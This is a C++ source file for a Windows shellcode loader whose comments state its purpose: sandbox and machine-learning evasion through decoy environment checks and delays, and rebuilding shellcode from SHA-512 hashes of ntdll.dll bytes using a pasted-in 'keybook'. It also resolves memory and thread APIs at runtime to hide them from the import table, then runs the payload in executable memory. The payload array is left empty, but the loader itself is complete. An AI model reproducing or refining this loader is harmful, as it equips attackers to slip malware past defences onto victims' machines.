#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "bcrypt.lib")

// --- DYNAMIC API TYPEDEFS ---
typedef LPVOID(WINAPI* PFUNC_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PFUNC_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* PFUNC_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* PFUNC_WaitForSingleObject)(HANDLE, DWORD);

struct KeybookEntry {
    uint64_t nonce;
    int offset;
    int length;
};

// ---------------------------------------------------------
// PHASE 1: STATISTICAL DILUTION & API STUFFING
// ---------------------------------------------------------
bool PerformDecoyInitialization() {
    volatile int entropy_score = 0;

    // Environmental Camouflage
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors > 1) entropy_score += 10;

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys > (1024 * 1024 * 1024)) entropy_score += 20;

    // Registry Interaction
    HKEY hKey;
    LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey);
    if (lRes == ERROR_SUCCESS) {
        entropy_score += 30;
        RegCloseKey(hKey);
    }

    // UI/Display Query
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    if (screenWidth > 800 && screenHeight > 600) entropy_score += 40;

    // Computational Delay tied to environment
    std::vector<int> primes;
    for (int i = 2; i < (entropy_score * 100); i++) {
        bool isPrime = true;
        for (int j = 2; j * j <= i; j++) {
            if (i % j == 0) { isPrime = false; break; }
        }
        if (isPrime) primes.push_back(i);
    }

    return (primes.size() > 10);
}

// ---------------------------------------------------------
// UTILITY FUNCTIONS (Safe for Even-Character Chunks Only)
// ---------------------------------------------------------
std::string BytesToHexString(const std::vector<BYTE>& bytes) {
    std::ostringstream oss;
    for (BYTE b : bytes) {
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    }
    return oss.str();
}

std::vector<BYTE> HexStringToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE b = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(b);
    }
    return bytes;
}

// ---------------------------------------------------------
// PHASE 2: THE GHOST LOADER
// ---------------------------------------------------------
int main() {
    // 1. SILENT ML EVASION
    if (!PerformDecoyInitialization()) {
        return 0; // Fails gracefully in sandboxes, looks benign
    }

    // 2. READ THE ENTROPY SOURCE
    const char* source_file = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hFile = CreateFileA(source_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    std::vector<BYTE> seed(5120);
    DWORD bytesRead;
    ReadFile(hFile, seed.data(), 5120, &bytesRead, NULL);
    CloseHandle(hFile);

    if (bytesRead != 5120) return 1;

    // ==========================================
    // PASTE YOUR EXTRACTED KEYBOOK ARRAY HERE
    // Ensure all length values are EVEN numbers!
    // ==========================================
    std::vector<KeybookEntry> keybook = {
        // {nonce, offset, length},
    };
    // ==========================================

    if (keybook.empty()) return 1;

    std::vector<BYTE> final_shellcode;

    // 3. INITIALIZE CRYPTOGRAPHY
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0);

    DWORD cbHashObject = 0, cbData = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
    std::vector<BYTE> pbHashObject(cbHashObject);
    std::vector<BYTE> pbHash(64);

    // 4. THE ASSEMBLY LOOP
    for (const auto& key : keybook) {
        BCRYPT_HASH_HANDLE hHash = NULL;
        BCryptCreateHash(hAlg, &hHash, pbHashObject.data(), cbHashObject, NULL, 0, 0);

        std::string nonce_str = std::to_string(key.nonce);
        BCryptHashData(hHash, seed.data(), seed.size(), 0);
        BCryptHashData(hHash, (PUCHAR)nonce_str.c_str(), nonce_str.length(), 0);
        BCryptFinishHash(hHash, pbHash.data(), pbHash.size(), 0);
        BCryptDestroyHash(hHash);

        std::string full_hash_hex = BytesToHexString(pbHash);
        std::string hex_fragment = full_hash_hex.substr(key.offset, key.length);
        std::vector<BYTE> raw_bytes = HexStringToBytes(hex_fragment);

        final_shellcode.insert(final_shellcode.end(), raw_bytes.begin(), raw_bytes.end());
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);

    // 5. DYNAMIC API RESOLUTION (Blind to IAT)
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    PFUNC_VirtualAlloc pVirtualAlloc = (PFUNC_VirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    PFUNC_VirtualProtect pVirtualProtect = (PFUNC_VirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
    PFUNC_CreateThread pCreateThread = (PFUNC_CreateThread)GetProcAddress(hKernel32, "CreateThread");
    PFUNC_WaitForSingleObject pWaitForSingleObject = (PFUNC_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) return 1;

    // 6. INVISIBLE EXECUTION
    void* exec_mem = pVirtualAlloc(0, final_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, final_shellcode.data(), final_shellcode.size());

    DWORD oldProtect;
    pVirtualProtect(exec_mem, final_shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread) {
        pWaitForSingleObject(hThread, 5000);
    }

    return 0;
}